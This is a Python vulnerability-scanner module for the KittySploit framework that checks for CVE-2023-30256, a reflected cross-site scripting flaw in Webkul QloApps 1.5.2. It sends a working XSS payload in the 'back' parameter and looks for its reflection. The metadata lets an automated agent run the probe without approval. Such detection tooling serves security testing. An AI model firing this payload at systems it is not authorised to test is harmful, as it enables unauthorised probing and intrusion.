#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Cross Site Scripting vulnerability found in Webkil QloApps v."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Webkul QloApps 1.5.2 - Cross-site Scripting Detection',
        'description': 'Cross Site Scripting vulnerability found in Webkil QloApps v.1.5.2 allows a remote attacker to obtain sensitive information via the back and email_create parameters in the AuthController.php file.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'packetstorm', 'xss', 'webkul-qloapps', 'unauth', 'webkul', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/webkul/hotelcommerce',
            'http://packetstormsecurity.com/files/172542/Webkul-Qloapps-1.5.2-Cross-Site-Scripting.html',
            'https://github.com/ahrixia/CVE-2023-30256',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-30256',
            'https://qloapps.com/',
        ],
        'cve': 'CVE-2023-30256',
    }

    def run(self):
        r = self.http_request(method="GET", path='/?rand=1679996611398&controller=authentication&SubmitCreate=1&ajax=true&email_create=a&back=xss%20onfocus%3dalert(document.domain)%20autofocus%3d%20xss&token=6c62b773f1b284ac4743871b300a0c4d', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('xss onfocus=alert(document.domain) autofocus= xss', 'hasConfirmation',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Webkul QloApps 1.5.2 - Cross-site Scripting detected",
                path='/?rand=1679996611398&controller=authentication&SubmitCreate=1&ajax=true&email_create=a&back=xss%20onfocus%3dalert(document.domain)%20autofocus%3d%20xss&token=6c62b773f1b284ac4743871b300a0c4d',
            )
            return True
        return False

